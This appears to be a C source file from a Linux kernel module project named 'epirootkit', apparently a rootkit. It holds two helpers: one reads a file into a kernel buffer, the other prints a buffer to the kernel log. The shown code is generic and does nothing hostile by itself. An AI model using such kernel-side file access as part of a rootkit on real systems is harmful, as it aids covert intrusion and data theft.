#include <linux/fs.h>
#include <linux/kernel.h>
#include "epirootkit.h"

/**
 * @brief Reads the content of a file into a dynamically allocated buffer.
 *
 * @param filename The name of the file to read.
 * @return char* - Returns a pointer to the buffer containing the file content, or NULL on failure.
 *                 The caller is responsible for freeing the allocated buffer.
 */
char *read_file(char *filename)
{
	struct file *file = NULL;
	char *buf = NULL;
	loff_t pos = 0;
	size_t buf_size = STD_BUFFER_SIZE;
	size_t total_read = 0;
	ssize_t read_size;

	// Open the file for reading
	file = filp_open(filename, O_RDONLY, 0);
	if (IS_ERR(file)) {
		ERR_MSG("read_file: failed to open file %s\n", filename);
		return NULL;
	}

	// Allocate initial memory for the buffer
	buf = kmalloc(buf_size, GFP_KERNEL);
	if (!buf) {
		filp_close(file, NULL);
		return NULL;
	}

	// Read the file content character by character
	while ((read_size = kernel_read(file, buf + total_read, 1, &pos)) > 0) {
		total_read += read_size;

		// Resize the buffer if needed
		if (total_read >= buf_size) {
			char *new_buf = krealloc(buf, buf_size * 2, GFP_KERNEL);
			if (!new_buf) {
				kfree(buf);
				filp_close(file, NULL);
				return NULL;
			}
			buf = new_buf;
			buf_size *= 2;
		}
	}

	if (read_size < 0) {
		kfree(buf);
		filp_close(file, NULL);
		return NULL;
	}

	buf[total_read] = '\0';
	filp_close(file, NULL);
	return buf;
}

/**
 * @brief Prints the content of a buffer to the kernel log.
 *
 * @param content The content to print.
 * @param level The log level to use for printing (INFO, WARN, ERR, CRIT).
 */
int print_file(char *content, enum text_level level){
	if (!content) {
		ERR_MSG("print_file: content is NULL\n");
		return -FAILURE;
	}

	// Print the content based on the specified log level
	switch (level) {
	case WARN:
		pr_warn("%s", content);
		break;
	case ERR:
		ERR_MSG("%s", content);
		break;
	case CRIT:
		pr_crit("%s", content);
		break;
	default:
		DBG_MSG("%s", content);
		break;
	}

	return SUCCESS;
}